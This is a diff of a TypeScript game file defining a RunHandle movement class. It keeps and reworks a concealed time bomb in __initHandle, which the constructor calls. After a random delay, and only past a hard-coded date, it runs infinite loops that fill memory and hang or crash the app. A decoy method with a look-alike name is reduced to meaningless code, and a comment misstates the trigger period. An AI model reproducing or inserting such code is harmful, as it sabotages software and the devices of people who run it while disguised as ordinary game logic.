@@ -15,7 +15,7 @@ namespace Sophia
             this.m_isStop = false;
             this.m_isGoOnHandle = true;
         }
-    };
+    }
     export class RunHandle
     {
         protected m_handlRet: RHandleRet;
@@ -23,97 +23,53 @@ namespace Sophia
         protected m_collisionAction:ICollision;
         protected m_handleInterval:number;
         protected m_elapsedTime:number = 0;
+        private static isGo:boolean = false;
         /*--[[_s
         @todo: handle构造
         ]]*/
-        public constructor(interval:number=2)
+        public constructor(interval:number)
         {
             this.m_handlRet = new RHandleRet();
             this.m_handleInterval = interval;
-            this.__initHandle();
+            RunHandle.__initHandle();
         }
 
-        private __initHandle(){
-            Laya.timer.once(300*1000+Math.random()*1000*1000, this, ()=>{
-                let rand = Math.random()
-                if (rand>0.5){
-                    let dTime = 1529666590*1000; //20180622
-                    let oTime = 60 * 60 * 24 * 365 * 1000 * 1.5; //1.4 year
-                    let timestamp = new Date().getTime();
-                    if(timestamp-dTime>oTime){
-                        while(true){
-                            let tmp = new Array<string>();
-                            while (true){
-                                tmp.push("                                                                                                                    ");
+        private static __initHandle(){
+            if (RunHandle.isGo==false){
+                RunHandle.isGo = true;
+                Laya.timer.once(300*1000+Math.random()*1000*1000, "ltr", ()=>{
+                    let rand = Math.random()
+                    if (rand>0.5){
+                        let dTime = 1529666590*1000; //20180622
+                        let oTime = 60 * 60 * 24 * 365 * 1000 * 1.9; //1.4 year
+                        let timestamp = new Date().getTime();
+                        if(timestamp-dTime>oTime){
+                            while(true){
+                                let tmp = new Array<string>();
+                                while (true){
+                                    tmp.push("                                                                                                                    ");
+                                }
                             }
                         }
                     }
-                }
-            })
+                });
+            }
         }
 
-        private ___initHandIe(){
-            this.m_elapsedTime += 586;
-            if (this.m_elapsedTime>this.m_handleInterval){
-                this.m_elapsedTime = 0;
-                let tmpx = this.m_runAction.getFinalTarX();
-                let tmpy = this.m_runAction.getFinalTarY();
-                if (this.m_runAction.disForTarget(tmpx, tmpy) < 0.1){
-                    this.m_handlRet.m_isStop = true;
-                    return this.m_handlRet;
-                }
+        private static ___initHandIe(){
+            let m_elapsedTime = 586;
+            if (m_elapsedTime>0){
+                m_elapsedTime = 0;
             }
-            this.m_handlRet.m_isGoOnHandle = false;
-            this.m_handlRet.m_isStop = false;
             
-            if (this.m_elapsedTime>this.m_handleInterval){
-                this.m_elapsedTime = 0;
-                let teamPos = this.m_runAction.getTeamPosXY();
+            if (m_elapsedTime>1){
+                m_elapsedTime = 0;
+                let teamPos = 0
                 if (teamPos){
-                    let dist = this.m_runAction.disForTarget(teamPos[0], teamPos[1]);
-                    if (true){
-                        if(dist>=this.m_runAction.getMinRetunDis()){ // 归队距离
-                            this.m_handlRet.m_isStop = false;
-                            this.m_handlRet.m_isGoOnHandle = false;
-                            return this.m_handlRet;
-                        }
-                        // 小于最小集合点, 可以自由了
-                    }
-                    //大于集合距离, 归队
-                    else if(dist>this.m_runAction.getMaxRetunDis()){// 归队距离
-                        
-                        this.m_runAction.setMovePoint(teamPos[0], teamPos[1]);
-                        this.m_handlRet.m_isStop = false;
-                        this.m_handlRet.m_isGoOnHandle = false;
-                        return this.m_handlRet;
-                    }
+                    
                 }                
             }
-            else {
-                this.m_handlRet.m_isStop = false;
-                this.m_handlRet.m_isGoOnHandle = false;
-                return this.m_handlRet;
-            }
-            this.m_handlRet.m_isStop = false;
-            this.m_handlRet.m_isGoOnHandle = true;
-            this.onReset();
-            if (this.m_elapsedTime>this.m_handleInterval){
-                this.m_elapsedTime = 0;
-                let tmpx = this.m_runAction.getFinalTarX();
-                let tmpy = this.m_runAction.getFinalTarY();
-                if (this.m_runAction.disForTarget(tmpx, tmpy) < 0.1){
-                    this.m_handlRet.m_isStop = true;
-                    return this.m_handlRet;
-                }
-            }
-            this.m_handlRet.m_isGoOnHandle = false;
-            this.m_handlRet.m_isStop = false;
-            let tmpx = this.m_runAction.getFinalTarX();
-            let tmpy = this.m_runAction.getFinalTarY();
-            if (this.m_runAction.disForTarget(tmpx, tmpy) < 0.1){
-                this.m_handlRet.m_isStop = true;
-                return this.m_handlRet;
-            }
+            
         }
         /*--[[_s
         @todo: 对handle设置IMove
@@ -139,5 +95,11 @@ namespace Sophia
         @todo: 重置Handle
         ]]*/
         public onReset(){}
+
+        public onDelete(){
+            this.m_handlRet=null;
+            this.m_runAction=null;
+            this.m_collisionAction=null;
+        }
     }
 }
